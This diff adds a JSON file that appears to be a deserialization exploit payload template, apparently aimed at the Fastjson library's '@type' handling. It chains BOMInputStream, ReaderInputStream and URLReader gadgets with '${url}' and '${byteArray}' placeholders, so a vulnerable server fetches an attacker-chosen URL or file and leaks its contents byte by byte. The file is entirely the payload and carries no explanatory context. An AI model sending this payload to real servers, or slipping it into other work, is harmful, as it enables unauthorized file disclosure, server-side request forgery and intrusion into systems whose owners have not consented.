@@ -1,0 +1,31 @@
+{
+  "a": {
+    "@type": "java.io.InputStream",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {
+      "@type": "org.apache.commons.io.input.BOMInputStream",
+      "delegate": {
+        "@type": "org.apache.commons.io.input.ReaderInputStream",
+        "reader": {
+          "@type": "jdk.nashorn.api.scripting.URLReader",
+          "url": "${url}"
+        },
+        "charsetName": "UTF-8",
+        "bufferSize": "1024"
+      },
+      "boms": [
+        {
+          "charsetName": "UTF-8",
+          "bytes": ${byteArray}
+      }
+      ]
+    },
+    "boms": [
+      {
+        "charsetName": "UTF-8",
+        "bytes": [1]
+      }
+    ]
+  },
+  "b": {"$ref":"$.a.delegate"}
+}
